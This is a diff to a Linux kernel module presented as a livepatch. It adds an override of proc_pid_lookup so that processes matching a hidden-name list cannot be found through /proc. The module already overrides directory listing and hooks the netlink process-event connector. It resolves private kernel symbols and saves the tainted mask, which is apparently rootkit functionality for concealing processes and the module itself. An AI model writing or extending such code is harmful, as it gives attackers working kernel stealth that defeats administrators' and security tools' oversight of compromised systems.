@@ -112,6 +112,9 @@ static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
 static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
                                    struct task_struct *task, const void *ptr) = NULL;
 
+static unsigned (*p_name_to_int)(const struct qstr *qstr) = NULL;
+static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns) = NULL;
+
 //static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
 
 static int *p_modules_disabled = NULL;
@@ -186,6 +189,47 @@ static int is_hidden_proc_name(const char *name, int len_name)
 end:
 	return 0;
 }
+
+static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
+{ 
+        struct task_struct *task;
+        unsigned tgid; 
+        struct pid_namespace *ns;
+        struct dentry *result = ERR_PTR(-ENOENT);
+
+        tgid = p_name_to_int(&dentry->d_name);
+        if (tgid == ~0U)
+                goto out;
+
+        ns = dentry->d_sb->s_fs_info;
+        rcu_read_lock();
+        task = p_find_task_by_pid_ns(tgid, ns);
+        if (task)
+                get_task_struct(task);
+        rcu_read_unlock();
+        if (!task)
+                goto out;
+
+	if (hidden_base_exe) {
+		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
+			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf))) {
+        			put_task_struct(task);
+				goto out;
+			}
+		}
+	} else {
+		if (is_hidden_proc_name(task->comm, sizeof(task->comm))) {
+        			put_task_struct(task);
+				goto out;
+		}
+	}
+
+        result = p_proc_pid_instantiate(dentry, task, NULL);
+        put_task_struct(task);
+out:
+        return result;
+}
+
 static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx)
 {
         struct tgid_iter iter;
@@ -680,6 +724,10 @@ static struct klp_func funcs[] = {
 		.new_func = livepatch_proc_pid_readdir,
 	}, 
 	{
+		.old_name = "proc_pid_lookup",
+		.new_func = livepatch_proc_pid_lookup,
+	}, 
+	{
 		.old_name = "cn_netlink_send",
 		.new_func = livepatch_cn_netlink_send,
 	}, 
@@ -834,6 +882,16 @@ static int livepatch_init(void)
 
 	p__printk_safe_exit = (void(*)(void)) kallsyms_lookup_name("__printk_safe_exit");
 	if (!p__printk_safe_exit)
+		return -1;
+
+	p_name_to_int = (unsigned (*)(const struct qstr *qstr))
+				 kallsyms_lookup_name("name_to_int");
+	if (!p_name_to_int)
+		return -1;
+
+	p_find_task_by_pid_ns = (struct task_struct *(*)(pid_t nr, struct pid_namespace *ns))
+				 kallsyms_lookup_name("find_task_by_pid_ns");
+	if (!p_find_task_by_pid_ns)
 		return -1;
 
 	save_tainted_mask();
